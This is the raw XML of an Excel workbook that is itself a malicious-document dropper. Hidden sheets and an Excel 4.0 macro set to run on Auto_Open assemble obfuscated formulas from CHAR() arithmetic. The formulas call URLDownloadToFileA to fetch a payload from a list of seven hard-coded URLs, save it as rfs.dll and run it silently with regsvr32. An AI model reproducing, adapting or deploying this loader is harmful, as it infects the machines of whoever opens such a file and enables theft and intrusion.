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osik\Desktop\File3\16m\CIR-ZV\CIR\"/>
    </mc:Choice>
  </mc:AlternateContent>
  <xr:revisionPtr revIDLastSave="0" documentId="13_ncr:1_{1EECE1DD-BA2B-4469-B98A-8CF398FE0B8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Cdfea" sheetId="2" state="hidden" r:id="rId2"/>
    <sheet name="Tgbs" sheetId="3" state="hidden" r:id="rId3"/>
    <sheet name="Tgbfgs" sheetId="4" state="hidden" r:id="rId4"/>
    <sheet name="PCWV" sheetId="5" state="hidden" r:id="rId5"/>
  </sheets>
  <definedNames>
    <definedName name="NEVR1">PCWV!$G$13</definedName>
    <definedName name="NEVR2">PCWV!$G$15</definedName>
    <definedName name="NEVR3">PCWV!$G$17</definedName>
    <definedName name="NEVR4">PCWV!$G$19</definedName>
    <definedName name="NEVR5">PCWV!$G$21</definedName>
    <definedName name="NEVR6">PCWV!$G$23</definedName>
    <definedName name="NEVR7">PCWV!$G$25</definedName>
    <definedName name="_xlnm.Auto_Open">PCWV!$G$1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21" i="3" l="1"/>
  <c r="I10" i="3"/>
  <c r="Q9" i="3"/>
  <c r="D7" i="3"/>
  <c r="F3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<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="19" uniqueCount="19">
  <si>
    <t>-</t>
  </si>
  <si>
    <t>G</t>
  </si>
  <si>
    <t>!</t>
  </si>
  <si>
    <t>/</t>
  </si>
  <si>
    <t xml:space="preserve">&lt;0, </t>
  </si>
  <si>
    <t xml:space="preserve"> ..\rfs.dll</t>
  </si>
  <si>
    <t>"..\rfs.dll</t>
  </si>
  <si>
    <t>",0,0)</t>
  </si>
  <si>
    <t>,0,</t>
  </si>
  <si>
    <t>r"&amp;"eg"&amp;"s"&amp;"vr3"&amp;"2.e"&amp;"x"&amp;"e</t>
  </si>
  <si>
    <t>\W"&amp;"ind"&amp;"o"&amp;"w"&amp;"s\</t>
  </si>
  <si>
    <t>S"&amp;"ysW"&amp;"ow"&amp;"64\</t>
  </si>
  <si>
    <t>"http://astroadvicebaba.com/assets/jYlBTPcWJTsTtamDfX/",</t>
  </si>
  <si>
    <t>"https://physioacademy.co.uk/conditions/8I3WSx5t2k/",</t>
  </si>
  <si>
    <t>"http://orchidbg.com/aeeiludqootr/OcnjiLHL/",</t>
  </si>
  <si>
    <t>"https://westthamesphysio.com/blog/3tsZIz09Sox1Z/",</t>
  </si>
  <si>
    <t>"http://snappylookphotobooth.com/headers/P/",</t>
  </si>
  <si>
    <t>"http://194.59.165.91/nbproject/1XFiatvBCRW9eh5JxptS/",</t>
  </si>
  <si>
    <t>"http://casadorothea.com/cc/H5v/",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</si>
</sst>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6/relationships/xlIntlMacrosheet" Target="macrosheets/intlsheet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600075</xdr:colOff>
      <xdr:row>1</xdr:row>
      <xdr:rowOff>7336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5C13C476-4CC6-4F3C-80B0-CC112DECA0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524875" cy="283561"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom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A0124FFD-D8B1-4C57-9FC3-DE9478087DFA}">
  <dimension ref="G8"/>
  <sheetViews>
    <sheetView showFormulas="1" workbookViewId="0">
      <selection activeCell="B4" sqref="B4"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="7" max="7" width="255.7109375" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="8" spans="7:7" x14ac:dyDescent="0.25">
      <c r="G8" t="b">
        <f>FORMULA(Cdfea!P22&amp;Cdfea!H9&amp;Cdfea!L2&amp;Cdfea!B15&amp;Cdfea!B15&amp;Tgbs!D7&amp;Tgbs!F3&amp;Cdfea!F10&amp;Tgbs!I10&amp;Cdfea!H4&amp;Cdfea!L2&amp;Tgbs!Q9&amp;Tgbfgs!J17&amp;Tgbs!F14&amp;Tgbfgs!S15&amp;Tgbfgs!F16,G13)=FORMULA(Cdfea!P22&amp;Cdfea!J11&amp;Cdfea!B18&amp;Cdfea!P11&amp;"NEVR1"&amp;Tgbfgs!Q5&amp;Cdfea!H9&amp;Cdfea!L2&amp;Cdfea!B15&amp;Cdfea!B15&amp;Tgbs!D7&amp;Tgbs!F3&amp;Cdfea!F10&amp;Tgbs!I10&amp;Cdfea!H4&amp;Cdfea!L2&amp;Tgbs!Q9&amp;Tgbfgs!J17&amp;Tgbs!G16&amp;Tgbfgs!S15&amp;Tgbfgs!F16&amp;Cdfea!P13,G15)=FORMULA(Cdfea!P22&amp;Cdfea!J11&amp;Cdfea!B18&amp;Cdfea!P11&amp;"NEVR2"&amp;Tgbfgs!Q5&amp;Cdfea!H9&amp;Cdfea!L2&amp;Cdfea!B15&amp;Cdfea!B15&amp;Tgbs!D7&amp;Tgbs!F3&amp;Cdfea!F10&amp;Tgbs!I10&amp;Cdfea!H4&amp;Cdfea!L2&amp;Tgbs!Q9&amp;Tgbfgs!J17&amp;Tgbs!H14&amp;Tgbfgs!S15&amp;Tgbfgs!F16&amp;Cdfea!P13,G17)=FORMULA(Cdfea!P22&amp;Cdfea!J11&amp;Cdfea!B18&amp;Cdfea!P11&amp;"NEVR3"&amp;Tgbfgs!Q5&amp;Cdfea!H9&amp;Cdfea!L2&amp;Cdfea!B15&amp;Cdfea!B15&amp;Tgbs!D7&amp;Tgbs!F3&amp;Cdfea!F10&amp;Tgbs!I10&amp;Cdfea!H4&amp;Cdfea!L2&amp;Tgbs!Q9&amp;Tgbfgs!J17&amp;Tgbs!I16&amp;Tgbfgs!S15&amp;Tgbfgs!F16&amp;Cdfea!P13,G19)=FORMULA(Cdfea!P22&amp;Cdfea!J11&amp;Cdfea!B18&amp;Cdfea!P11&amp;"NEVR4"&amp;Tgbfgs!Q5&amp;Cdfea!H9&amp;Cdfea!L2&amp;Cdfea!B15&amp;Cdfea!B15&amp;Tgbs!D7&amp;Tgbs!F3&amp;Cdfea!F10&amp;Tgbs!I10&amp;Cdfea!H4&amp;Cdfea!L2&amp;Tgbs!Q9&amp;Tgbfgs!J17&amp;Tgbs!J14&amp;Tgbfgs!S15&amp;Tgbfgs!F16&amp;Cdfea!P13,G21)=FORMULA(Cdfea!P22&amp;Cdfea!J11&amp;Cdfea!B18&amp;Cdfea!P11&amp;"NEVR5"&amp;Tgbfgs!Q5&amp;Cdfea!H9&amp;Cdfea!L2&amp;Cdfea!B15&amp;Cdfea!B15&amp;Tgbs!D7&amp;Tgbs!F3&amp;Cdfea!F10&amp;Tgbs!I10&amp;Cdfea!H4&amp;Cdfea!L2&amp;Tgbs!Q9&amp;Tgbfgs!J17&amp;Tgbs!K16&amp;Tgbfgs!S15&amp;Tgbfgs!F16&amp;Cdfea!P13,G23)=FORMULA(Cdfea!P22&amp;Cdfea!J11&amp;Cdfea!B18&amp;Cdfea!P11&amp;"NEVR6"&amp;Tgbfgs!Q5&amp;Cdfea!H9&amp;Cdfea!L2&amp;Cdfea!B15&amp;Cdfea!B15&amp;Tgbs!D7&amp;Tgbs!F3&amp;Cdfea!F10&amp;Tgbs!I10&amp;Cdfea!H4&amp;Cdfea!L2&amp;Tgbs!Q9&amp;Tgbfgs!J17&amp;Tgbs!L14&amp;Tgbfgs!S15&amp;Tgbfgs!F16&amp;Cdfea!P13,G25)=FORMULA(Cdfea!P22&amp;Cdfea!J11&amp;Cdfea!B18&amp;Cdfea!P11&amp;"NEVR7"&amp;Tgbfgs!Q5&amp;Cdfea!H9&amp;Cdfea!B15&amp;Cdfea!I17&amp;Cdfea!I3&amp;Cdfea!H13&amp;Cdfea!P11&amp;Cdfea!K9&amp;Cdfea!P13&amp;Cdfea!P7&amp;Cdfea!P13,G27)=FORMULA(Cdfea!P22&amp;Cdfea!H13&amp;Cdfea!N4&amp;Cdfea!H13&amp;Cdfea!H9&amp;Cdfea!P11&amp;Cdfea!P15&amp;Cdfea!H9&amp;Cdfea!P20&amp;Tgbfgs!M12&amp;Tgbfgs!N8&amp;Tgbfgs!I4&amp;Tgbs!R21&amp;Tgbfgs!G10&amp;Cdfea!P15&amp;Cdfea!P13,G29)=FORMULA(Cdfea!P22&amp;Cdfea!G24&amp;Cdfea!H13&amp;Cdfea!E6&amp;Cdfea!E11&amp;Cdfea!G24&amp;Cdfea!K23&amp;Cdfea!P11&amp;Cdfea!P13,G34)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M34" sqref="AM34"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="1" s="1" customFormat="1" ht="21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4DC43-2A26-40AB-9832-2194C1732D78}">
  <dimension ref="A2:Q37"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="F6" sqref="F6"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="2" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E2" t="str">
        <f>CHAR(113-2)</f>
        <v>o</v>
      </c>
      <c r="G2" t="str">
        <f>CHAR(111-6)</f>
        <v>i</v>
      </c>
      <c r="L2" t="str">
        <f>CHAR(71-6)</f>
        <v>A</v>
      </c>
      <c r="P2" t="s">
        <v>0</v>
      </c>
    </row>
    <row r="3" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C3" t="str">
        <f>CHAR(111+3)</f>
        <v>r</v>
      </c>
      <c r="I3" t="str">
        <f>CHAR(87-4)</f>
        <v>S</v>
      </c>
      <c r="P3" t="str">
        <f>CHAR(90+2)</f>
        <v>\</v>
      </c>
    </row>
    <row r="4" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F4" t="str">
        <f>CHAR(100-18)</f>
        <v>R</v>
      </c>
      <c r="H4" t="str">
        <f>CHAR(110-9)</f>
        <v>e</v>
      </c>
      <c r="K4">
        <v>1</v>
      </c>
      <c r="N4" t="str">
        <f>CHAR(89-1)</f>
        <v>X</v>
      </c>
    </row>
    <row r="5" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B5" t="str">
        <f>CHAR(115+2)</f>
        <v>u</v>
      </c>
      <c r="P5" t="str">
        <f>CHAR(44+2)</f>
        <v>.</v>
      </c>
    </row>
    <row r="6" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E6" t="str">
        <f>CHAR(90-6)</f>
        <v>T</v>
      </c>
      <c r="J6" t="str">
        <f>CHAR(77-3)</f>
        <v>J</v>
      </c>
    </row>
    <row r="7" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D7" t="str">
        <f>CHAR(107+3)</f>
        <v>n</v>
      </c>
      <c r="F7">
        <v>3</v>
      </c>
      <c r="M7" t="str">
        <f>CHAR(117-2)</f>
        <v>s</v>
      </c>
      <c r="P7" t="str">
        <f>CHAR(41+3)</f>
        <v>,</v>
      </c>
    </row>
    <row r="9" spans="1:16" x14ac:dyDescent="0.25">
      <c r="C9" t="str">
        <f>CHAR(110-2)</f>
        <v>l</v>
      </c>
      <c r="H9" t="str">
        <f>CHAR(70-3)</f>
        <v>C</v>
      </c>
      <c r="K9" t="str">
        <f>CHAR(55-7)</f>
        <v>0</v>
      </c>
      <c r="P9" t="str">
        <f>CHAR(55+5)</f>
        <v>&lt;</v>
      </c>
    </row>
    <row r="10" spans="1:16" x14ac:dyDescent="0.25">
      <c r="F10" t="str">
        <f>CHAR(123-4)</f>
        <v>w</v>
      </c>
    </row>
    <row r="11" spans="1:16" x14ac:dyDescent="0.25">
      <c r="E11" t="str">
        <f>CHAR(80+5)</f>
        <v>U</v>
      </c>
      <c r="J11" t="str">
        <f>CHAR(80-7)</f>
        <v>I</v>
      </c>
      <c r="L11" t="str">
        <f>CHAR(100-1)</f>
        <v>c</v>
      </c>
      <c r="P11" t="str">
        <f>CHAR(35+5)</f>
        <v>(</v>
      </c>
    </row>
    <row r="12" spans="1:16" x14ac:dyDescent="0.25">
      <c r="A12" t="str">
        <f>CHAR(107+2)</f>
        <v>m</v>
      </c>
    </row>
    <row r="13" spans="1:16" x14ac:dyDescent="0.25">
      <c r="D13" t="str">
        <f>CHAR(72-4)</f>
        <v>D</v>
      </c>
      <c r="H13" t="str">
        <f>CHAR(68+1)</f>
        <v>E</v>
      </c>
      <c r="N13">
        <v>2</v>
      </c>
      <c r="P13" t="str">
        <f>CHAR(36+5)</f>
        <v>)</v>
      </c>
    </row>
    <row r="14" spans="1:16" x14ac:dyDescent="0.25">
      <c r="G14" t="str">
        <f>CHAR(124-4)</f>
        <v>x</v>
      </c>
      <c r="K14" t="str">
        <f>CHAR(70-4)</f>
        <v>B</v>
      </c>
    </row>
    <row r="15" spans="1:16" x14ac:dyDescent="0.25">
      <c r="B15" t="str">
        <f>CHAR(80-4)</f>
        <v>L</v>
      </c>
      <c r="F15" t="str">
        <f>CHAR(105-5)</f>
        <v>d</v>
      </c>
      <c r="P15" t="str">
        <f>CHAR(31+3)</f>
        <v>"</v>
      </c>
    </row>
    <row r="17" spans="2:16" x14ac:dyDescent="0.25">
      <c r="D17" t="str">
        <f>CHAR(102-5)</f>
        <v>a</v>
      </c>
      <c r="I17" t="str">
        <f>CHAR(78+1)</f>
        <v>O</v>
      </c>
      <c r="K17" t="s">
        <v>1</v>
      </c>
      <c r="P17" t="str">
        <f>CHAR(40-2)</f>
        <v>&amp;</v>
      </c>
    </row>
    <row r="18" spans="2:16" x14ac:dyDescent="0.25">
      <c r="B18" t="str">
        <f>CHAR(65+5)</f>
        <v>F</v>
      </c>
    </row>
    <row r="19" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P19" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="20" spans="2:16" x14ac:dyDescent="0.25">
      <c r="H20">
        <v>8</v>
      </c>
      <c r="P20" t="str">
        <f>CHAR(52+6)</f>
        <v>:</v>
      </c>
    </row>
    <row r="22" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P22" t="str">
        <f>CHAR(66-5)</f>
        <v>=</v>
      </c>
    </row>
    <row r="23" spans="2:16" x14ac:dyDescent="0.25">
      <c r="K23" t="str">
        <f>CHAR(80-2)</f>
        <v>N</v>
      </c>
    </row>
    <row r="24" spans="2:16" x14ac:dyDescent="0.25">
      <c r="G24" t="str">
        <f>CHAR(84-2)</f>
        <v>R</v>
      </c>
      <c r="P24" t="s">
        <v>2</v>
      </c>
    </row>
    <row r="26" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I26" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
    </row>
    <row r="27" spans="2:16" x14ac:dyDescent="0.25">
      <c r="P27" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="32" spans="2:16" x14ac:dyDescent="0.25">
      <c r="I32">
        <f>_xlfn.ARABIC("CXI")</f>
        <v>111</v>
      </c>
    </row>
    <row r="33" spans="5:17" x14ac:dyDescent="0.25">
      <c r="O33">
        <f>_xlfn.ARABIC("LXVII")</f>
        <v>67</v>
      </c>
    </row>
    <row r="35" spans="5:17" x14ac:dyDescent="0.25">
      <c r="E35">
        <f>_xlfn.ARABIC("LXI")</f>
        <v>61</v>
      </c>
    </row>
    <row r="36" spans="5:17" x14ac:dyDescent="0.25">
      <c r="Q36">
        <f>_xlfn.ARABIC("CXIV")</f>
        <v>114</v>
      </c>
    </row>
    <row r="37" spans="5:17" x14ac:dyDescent="0.25">
      <c r="K37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11B45-B805-4F38-B230-891F0A33704C}">
  <dimension ref="D3:R21"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="L15" sqref="L15"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="3" spans="4:17" x14ac:dyDescent="0.25">
      <c r="F3" t="str">
        <f>T(Cdfea!E2&amp;Cdfea!D7&amp;Cdfea!P15&amp;Cdfea!P7&amp;Cdfea!P15&amp;Cdfea!E11&amp;Cdfea!F4&amp;Cdfea!B15&amp;Cdfea!D13&amp;Cdfea!E2)</f>
        <v>on","URLDo</v>
      </c>
    </row>
    <row r="7" spans="4:17" x14ac:dyDescent="0.25">
      <c r="D7" t="str">
        <f>T(Cdfea!P11&amp;Cdfea!P15&amp;Cdfea!B5&amp;Cdfea!C3&amp;Cdfea!C9&amp;Cdfea!A12)</f>
        <v>("urlm</v>
      </c>
    </row>
    <row r="9" spans="4:17" x14ac:dyDescent="0.25">
      <c r="Q9" t="str">
        <f>T(Cdfea!P15&amp;Cdfea!P7&amp;Cdfea!P15&amp;Cdfea!J6&amp;Cdfea!J6&amp;Cdfea!H9&amp;Cdfea!H9&amp;Cdfea!K14&amp;Cdfea!K14&amp;Cdfea!P15)</f>
        <v>","JJCCBB"</v>
      </c>
    </row>
    <row r="10" spans="4:17" x14ac:dyDescent="0.25">
      <c r="I10" t="str">
        <f>T(Cdfea!D7&amp;Cdfea!C9&amp;Cdfea!E2&amp;Cdfea!D17&amp;Cdfea!F15&amp;Cdfea!E6&amp;Cdfea!E2&amp;Cdfea!B18&amp;Cdfea!G2&amp;Cdfea!C9)</f>
        <v>nloadToFil</v>
      </c>
    </row>
    <row r="14" spans="4:17" x14ac:dyDescent="0.25">
      <c r="F14" t="s">
        <v>12</v>
      </c>
      <c r="H14" t="s">
        <v>14</v>
      </c>
      <c r="J14" t="s">
        <v>16</v>
      </c>
      <c r="L14" t="s">
        <v>18</v>
      </c>
    </row>
    <row r="16" spans="4:17" x14ac:dyDescent="0.25">
      <c r="G16" t="s">
        <v>13</v>
      </c>
      <c r="I16" t="s">
        <v>15</v>
      </c>
      <c r="K16" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="21" spans="18:18" x14ac:dyDescent="0.25">
      <c r="R21" t="str">
        <f>T(Cdfea!P19&amp;Cdfea!P2&amp;Cdfea!M7)</f>
        <v xml:space="preserve"> -s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98958-9042-4603-92C7-5EE1B68922FF}">
  <dimension ref="F4:S17"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="B3" sqref="B3"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <sheetData>
    <row r="4" spans="6:19" x14ac:dyDescent="0.25">
      <c r="I4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="5" spans="6:19" x14ac:dyDescent="0.25">
      <c r="Q5" t="s">
        <v>4</v>
      </c>
    </row>
    <row r="8" spans="6:19" x14ac:dyDescent="0.25">
      <c r="N8" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="10" spans="6:19" x14ac:dyDescent="0.25">
      <c r="G10" t="s">
        <v>5</v>
      </c>
    </row>
    <row r="12" spans="6:19" x14ac:dyDescent="0.25">
      <c r="M12" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="15" spans="6:19" x14ac:dyDescent="0.25">
      <c r="S15" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="16" spans="6:19" x14ac:dyDescent="0.25">
      <c r="F16" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="17" spans="10:10" x14ac:dyDescent="0.25">
      <c r="J17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1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="5" baseType="lpstr">
      <vt:lpstr>Sheet</vt:lpstr>
      <vt:lpstr>Cdfea</vt:lpstr>
      <vt:lpstr>Tgbs</vt:lpstr>
      <vt:lpstr>Tgbfgs</vt:lpstr>
      <vt:lpstr>PCWV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Igsberb</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:19:34Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-03-16T17:42:18Z</dcterms:modified>
</cp:coreProperties>
</file>